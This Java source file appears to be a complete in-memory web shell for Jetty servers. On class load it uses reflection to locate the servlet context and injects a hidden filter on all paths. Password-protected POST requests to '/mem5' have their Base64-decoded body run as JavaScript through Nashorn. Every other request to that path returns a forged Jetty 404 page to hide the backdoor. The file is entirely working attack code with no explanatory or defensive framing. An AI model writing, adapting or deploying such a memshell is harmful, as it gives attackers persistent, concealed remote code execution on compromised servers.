import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import javax.script.*;


public class mem5 {
    static {
        try { inject(); } catch (Exception e) {}
    }

    static final String PASSWORD = "guangnian";
    static final String SUFFIX = "/mem5";
    static final String PAGE_404 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html;charset=ISO-8859-1\"/><title>Error 404 Not Found</title></head><body><h2>HTTP ERROR 404 Not Found</h2><table><tr><th>URI:</th><td>/mem5</td></tr><tr><th>STATUS:</th><td>404</td></tr><tr><th>MESSAGE:</th><td>Not Found</td></tr><tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet</td></tr></table><hr/><a href=\"https://eclipse.org/jetty\">Powered by Jetty:// 9.4.x</a><hr/></body></html>";

    static boolean injected = false;

    public static void inject() throws Exception {
        if (injected) return;


        // 1. Find Jetty ServletContextHandler
        Object ctxHandler = findServletContextHandler();
        if (ctxHandler == null) return;

        // 2. Get ServletHandler
        Object servletHandler = ctxHandler.getClass().getMethod("getServletHandler").invoke(ctxHandler);
        if (servletHandler == null) return;

        // 3. Cache reflected classes
        Class<?> filterCls = Class.forName("javax.servlet.Filter");
        Class<?> srvReqCls = Class.forName("javax.servlet.ServletRequest");
        Class<?> srvRespCls = Class.forName("javax.servlet.ServletResponse");
        Class<?> httpReqCls = Class.forName("javax.servlet.http.HttpServletRequest");
        Class<?> httpRespCls = Class.forName("javax.servlet.http.HttpServletResponse");
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");
        if (engine == null) return;


        Object filter = Proxy.newProxyInstance(
            filterCls.getClassLoader(),
            new Class[]{filterCls},
            new InvocationHandler() {
                public Object invoke(Object proxy, Method m, Object[] args) throws Throwable {
                    if (!"doFilter".equals(m.getName())) return null;
                    Object req = args[0], res = args[1], chain = args[2];
                    String uri = (String) httpReqCls.getMethod("getRequestURI").invoke(req);
                    if (uri != null && uri.endsWith(SUFFIX)) {
                        try {
                            String method = (String) httpReqCls.getMethod("getMethod").invoke(req);


                            InputStream is = (InputStream) srvReqCls.getMethod("getInputStream").invoke(req);
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            byte[] buf = new byte[4096];
                            int len;
                            while ((len = is.read(buf)) != -1) baos.write(buf, 0, len);
                            String body = new String(baos.toByteArray(), "UTF-8").trim();

                            String code = null, rawText = null;


                            if (!body.isEmpty()) {
                                for (String p : body.split("&")) {
                                    if (p.startsWith(PASSWORD + "=")) {
                                        String raw = p.substring(PASSWORD.length() + 1);
                                        try { raw = java.net.URLDecoder.decode(raw, "UTF-8"); } catch (Exception e2) {}
                                        rawText = raw;
                                        try { code = new String(Base64.getDecoder().decode(raw), "UTF-8"); }
                                        catch (Exception e2) { code = raw; }
                                        break;
                                    }
                                }

                                if (code == null) {
                                    rawText = body;
                                    try { code = new String(Base64.getDecoder().decode(body), "UTF-8"); }
                                    catch (Exception e2) { code = body; }
                                }
                            }


                            if (code == null) {
                                Object val = httpReqCls.getMethod("getParameter", String.class).invoke(req, PASSWORD);
                                if (val != null) {
                                    rawText = (String) val;
                                    try { code = new String(Base64.getDecoder().decode((String) val), "UTF-8"); }
                                    catch (Exception e2) { code = (String) val; }
                                }
                            }


                            if ("POST".equalsIgnoreCase(method) && code != null && !code.isEmpty()) {
                                StringWriter sw = new StringWriter();
                                engine.getContext().setWriter(sw);
                                engine.getContext().setErrorWriter(sw);
                                try { engine.eval(code); } catch (Exception e3) {
                                    sw.write(rawText != null ? rawText : PASSWORD + "\n");
                                }
                                String output = sw.toString();
                                if (!output.contains(PASSWORD)) output = PASSWORD + "\n" + output;
                                httpRespCls.getMethod("setContentType", String.class).invoke(res, "text/plain;charset=UTF-8");
                                byte[] outBytes = output.getBytes("UTF-8");
                                Object os = srvRespCls.getMethod("getOutputStream").invoke(res);
                                os.getClass().getMethod("write", byte[].class).invoke(os, outBytes);
                                os.getClass().getMethod("flush").invoke(os);
                            } else {

                                httpRespCls.getMethod("setStatus", int.class).invoke(res, 404);
                                httpRespCls.getMethod("setContentType", String.class).invoke(res, "text/html;charset=UTF-8");
                                byte[] outBytes = PAGE_404.getBytes("UTF-8");
                                Object os = srvRespCls.getMethod("getOutputStream").invoke(res);
                                os.getClass().getMethod("write", byte[].class).invoke(os, outBytes);
                                os.getClass().getMethod("flush").invoke(os);
                            }
                        } catch (Exception e) {}
                    } else {
                        Method doFilter = chain.getClass().getMethod("doFilter", srvReqCls, srvRespCls);
                        doFilter.setAccessible(true);
                        doFilter.invoke(chain, req, res);
                    }
                    return null;
                }
            }
        );


        Class<?> fhCls = Class.forName("org.eclipse.jetty.servlet.FilterHolder");
        Object fh = fhCls.getConstructor(filterCls).newInstance(filter);
        fhCls.getMethod("setName", String.class).invoke(fh, "mem5filter");

        Class<?> dtCls = Class.forName("javax.servlet.DispatcherType");
        Object reqDT = Enum.valueOf((Class<Enum>) dtCls, "REQUEST");
        @SuppressWarnings({"unchecked", "rawtypes"})
        EnumSet allDT = EnumSet.of((Enum) reqDT);


        try {
            Method afwm = servletHandler.getClass().getMethod(
                "addFilterWithMapping", fhCls, String.class, EnumSet.class);
            afwm.invoke(servletHandler, fh, "/*", allDT);
        } catch (NoSuchMethodException ex) {

            servletHandler.getClass().getMethod("addFilter", fhCls).invoke(servletHandler, fh);
            Class<?> fmCls = Class.forName("org.eclipse.jetty.servlet.FilterMapping");
            Object fm = fmCls.newInstance();
            fmCls.getMethod("setFilterHolder", fhCls).invoke(fm, fh);
            fmCls.getMethod("setPathSpecs", String[].class).invoke(fm, (Object) new String[]{"/*"});
            fmCls.getMethod("setDispatcherTypes", EnumSet.class).invoke(fm, allDT);
            servletHandler.getClass().getMethod("addFilterMapping", fmCls).invoke(servletHandler, fm);
        }


        try { fhCls.getMethod("start").invoke(fh); }
        catch (Exception e) { fhCls.getMethod("doStart").invoke(fh); }

        injected = true;
    }


    static Object findServletContextHandler() {
        Set<Integer> visited = new HashSet<>();


        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Object found = walk(cl, visited, 0);
            if (found != null) return found;
        } catch (Exception e) {}


        Thread[] threads = new Thread[Thread.activeCount() * 4];
        int n = Thread.enumerate(threads);
        for (int i = 0; i < n; i++) {
            if (threads[i] == null) continue;
            try {

                Field tf = Thread.class.getDeclaredField("target");
                tf.setAccessible(true);
                Object target = tf.get(threads[i]);
                if (target != null) {
                    Object found = walk(target, visited, 0);
                    if (found != null) return found;
                }
            } catch (Exception e) {}

            try {
                Object found = walk(threads[i], visited, 0);
                if (found != null) return found;
            } catch (Exception e) {}
        }

        return null;
    }

    static Object walk(Object obj, Set<Integer> visited, int depth) {
        if (obj == null || depth > 12) return null;
        int id = System.identityHashCode(obj);
        if (visited.contains(id)) return null;
        visited.add(id);

        String cn = obj.getClass().getName();

        if (cn.equals("org.eclipse.jetty.servlet.ServletContextHandler")
            || cn.equals("org.eclipse.jetty.webapp.WebAppContext"))
            return obj;

        // Try getServletHandler on any Jetty handler-like object
        if (cn.contains("ServletContextHandler") || cn.contains("WebAppContext")
            || cn.contains("Handler") || cn.startsWith("org.eclipse.jetty")) {
            try {
                Method gsh = obj.getClass().getMethod("getServletHandler");
                Object sh = gsh.invoke(obj);
                if (sh != null) return obj;
            } catch (Exception e) {}
        }

        if (cn.contains("ServletContextHandler") && cn.contains("$")) {

            try {
                Method getCH = obj.getClass().getMethod("getContextHandler");
                Object ch = getCH.invoke(obj);
                if (ch != null && ch.getClass().getName().equals("org.eclipse.jetty.servlet.ServletContextHandler"))
                    return ch;

                if (ch != null && ch.getClass().getName().contains("ServletContextHandler"))
                    return ch;
            } catch (Exception e) {}

            try {
                Field f = obj.getClass().getDeclaredField("this$0");
                f.setAccessible(true);
                Object outer = f.get(obj);
                if (outer != null && outer.getClass().getName().contains("ServletContextHandler"))
                    return outer;
            } catch (Exception e) {}

            for (Field f : obj.getClass().getDeclaredFields()) {
                f.setAccessible(true);
                try {
                    Object val = f.get(obj);
                    if (val != null && val.getClass().getName().contains("ServletContextHandler"))
                        return val;
                } catch (Exception e) {}
            }

        }


        if (obj.getClass().isArray() && !obj.getClass().getComponentType().isPrimitive()) {
            try {
                Object[] arr = (Object[]) obj;
                for (int i = 0; i < Math.min(arr.length, 32); i++) {
                    Object found = walk(arr[i], visited, depth + 1);
                    if (found != null) return found;
                }
            } catch (Exception e) {}
        }


        if (obj instanceof Iterable) {
            int count = 0;
            for (Object item : (Iterable) obj) {
                if (count++ > 32) break;
                Object found = walk(item, visited, depth + 1);
                if (found != null) return found;
            }
        }


        String[] methods = {"getHandler", "getChildHandler", "getChildHandlers",
                           "getHandlers", "getServer", "getConnector"};
        for (String mn : methods) {
            try {
                Method gm = obj.getClass().getMethod(mn);
                Object val = gm.invoke(obj);
                Object found = walk(val, visited, depth + 1);
                if (found != null) return found;
            } catch (Exception e) {}
        }

      
        for (Field f : obj.getClass().getDeclaredFields()) {
            if (Modifier.isStatic(f.getModifiers())) continue;
            if (f.getType().isPrimitive()) continue;
            try {
                f.setAccessible(true);
                Object val = f.get(obj);
                Object found = walk(val, visited, depth + 1);
                if (found != null) return found;
            } catch (Exception e) {}
        }

        return null;
    }
}
